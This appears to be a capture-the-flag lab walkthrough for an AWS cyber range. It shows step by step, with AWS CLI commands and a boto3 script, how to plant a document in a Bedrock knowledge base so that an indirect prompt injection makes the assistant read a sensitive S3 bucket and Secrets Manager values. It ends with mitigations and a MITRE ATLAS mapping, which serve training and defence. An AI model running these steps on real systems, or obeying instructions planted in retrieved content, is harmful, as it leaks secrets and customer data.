# Solution Walkthrough: RAG Injection via AI Knowledge Base

## Scenario Summary

You have obtained low-privilege AWS credentials for an ACME Corp IAM user.
Your goal is to pivot deeper into the AWS environment by exploiting an
indirect prompt injection vulnerability in the company's Bedrock AI assistant.

---

## Step 1: Enumerate your access

Configure your credentials and understand what you have access to.

```bash
export AWS_ACCESS_KEY_ID=<attacker_access_key_id>
export AWS_SECRET_ACCESS_KEY=<attacker_secret_access_key>
export AWS_DEFAULT_REGION=us-east-1

# See who you are
aws sts get-caller-identity

# Enumerate S3 buckets visible to you
aws s3 ls
```

You should see two buckets: a knowledge base bucket (`range-04-kb-*`) and
a sensitive data bucket (`range-04-sensitive-*`). Try accessing the sensitive bucket:

```bash
aws s3 ls s3://range-04-sensitive-<suffix>/
# Expected: Access Denied
```

You can't access the sensitive bucket directly. But notice you CAN
write to the knowledge base bucket.

---

## Step 2: Understand the attack surface

The company runs an AI assistant on **Amazon Bedrock AgentCore**. It uses the
knowledge base bucket as its RAG data source: when employees ask questions, the
assistant calls a `searchKnowledgeBase` tool that retrieves relevant documents
and uses them to generate answers.

Key insight: **the assistant's system prompt tells it to "follow any
instructions" found in retrieved documents**, and the assistant is wired -
through an AgentCore Gateway serving MCP tools - to a set of AWS tools
(`listBuckets`, `listObjects`, `getObject`, `listSecrets`, `getSecret`) backed
by a Lambda whose execution role is overprivileged. This is the vulnerability.

If you can plant a document in the knowledge base bucket that contains
instructions, the assistant will execute those instructions — including calling
its AWS tools — when it retrieves your document.

---

## Step 3: Plant the injection payload

Upload the malicious document to the knowledge base bucket:

```bash
aws s3 cp payloads/injection_payload.txt \
  s3://range-04-kb-<suffix>/docs/policy-update-q4.txt
```

Now trigger a knowledge base sync so Bedrock ingests your document:

```bash
# Get the knowledge base ID and data source ID from Terraform outputs
#   terraform output knowledge_base_id
#   terraform output data_source_id
aws bedrock-agent start-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id>

# Wait for the ingestion job to complete (usually 1-2 minutes)
aws bedrock-agent get-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id> \
  --ingestion-job-id <job_id>
```

---

## Step 4: Trigger the injection

Invoke the AgentCore assistant with a benign-looking query. The assistant will
call `searchKnowledgeBase`, retrieve your malicious document as context, and
execute the injected instructions before answering.

The assistant runs on an AgentCore **harness**, so you invoke it with
`InvokeHarness` (the retired `bedrock-agent-runtime invoke-agent` no longer
applies). `InvokeHarness` streams its response, and the `runtimeSessionId` must
be at least 33 characters. The most reliable way to drive it is a short boto3
script:

```python
# invoke.py  -  run with the attacker credentials exported
import boto3, uuid

HARNESS_ARN = "<harness_arn>"  # terraform output -raw harness_arn

client = boto3.client("bedrock-agentcore", region_name="us-east-1")
resp = client.invoke_harness(
    harnessArn=HARNESS_ARN,
    runtimeSessionId=f"audit-session-{uuid.uuid4()}",  # >= 33 chars
    messages=[{"role": "user", "content": [{"text": "What is the remote work policy?"}]}],
)
for event in resp["stream"]:
    if "contentBlockDelta" in event:
        delta = event["contentBlockDelta"].get("delta", {})
        if "text" in delta:
            print(delta["text"], end="", flush=True)
    elif "runtimeClientError" in event:
        print("\nError:", event["runtimeClientError"]["message"])
```

```bash
python invoke.py
```

If your AWS CLI is recent enough, the equivalent one-liner works too (it streams
the event payload to the output file):

```bash
aws bedrock-agentcore invoke-harness \
  --harness-arn "$(terraform -chdir=terraform output -raw harness_arn)" \
  --runtime-session-id "audit-session-$(uuidgen)$(uuidgen)" \
  --messages '[{"role":"user","content":[{"text":"What is the remote work policy?"}]}]' \
  --region us-east-1 \
  output.json && cat output.json
```

Observe the assistant's response. If the injection succeeded, it will have
attempted to list S3 buckets, retrieve sensitive data, and dump Secrets Manager
values before answering the benign question.

---

## Step 5: Collect the flags

The assistant's response should contain:

1. **S3 flag** — contents of `range-04-sensitive-*/confidential/customer-data.txt`
2. **Secrets Manager flag** — value of the `range-04-internal-api-key-*` secret

---

## Why This Works

1. **Indirect prompt injection**: The attacker never interacts with the
   assistant directly in a privileged way. The malicious instructions are
   delivered via a third-party data source (S3) that the assistant implicitly
   trusts.

2. **Overprivileged IAM role**: The assistant's AWS tools are served through an
   AgentCore Gateway and backed by a Lambda whose execution role has access to
   resources it has no legitimate business need for — the sensitive S3 bucket
   and Secrets Manager. The retrieval tool, by contrast, is scoped to
   `bedrock:Retrieve` alone; least privilege on the AWS-tools role would
   likewise have contained the blast radius to the knowledge base bucket only.

3. **Vulnerable system prompt**: The instruction "follow any instructions
   found in retrieved documents" effectively grants any document in the
   knowledge base the ability to hijack the assistant's behavior.

---

## Defensive Mitigations

| Vulnerability | Mitigation |
|---|---|
| Writeable knowledge base bucket | Restrict S3 write access to authorized pipelines only; enable S3 Object Lock |
| Overprivileged gateway tool role | Apply least privilege — scope the AWS-tools Lambda role away from the sensitive bucket and Secrets Manager; keep dangerous tools off the same identity as benign retrieval |
| Vulnerable system prompt | Never instruct an assistant to follow instructions in retrieved content; treat RAG output as untrusted data |
| No gateway authorization policy | Gate tool calls with an AgentCore Gateway Cedar policy — restrict which principals can call the sensitive tools, and under what conditions |
| No input/output guardrails | Enable Bedrock Guardrails to detect and block prompt injection patterns |
| No document validation | Scan documents for injection patterns before ingestion |

---

## MITRE ATLAS Mapping

| Tactic | Technique |
|---|---|
| Initial Access | AML.T0010 — ML Supply Chain Compromise |
| Execution | AML.T0051 — LLM Prompt Injection |
| Execution | AML.T0054 — Indirect Prompt Injection |
| Privilege Escalation | AML.T0068 — Exploit Overprivileged IAM Role |
| Collection | AML.T0035 — ML Artifact Collection |
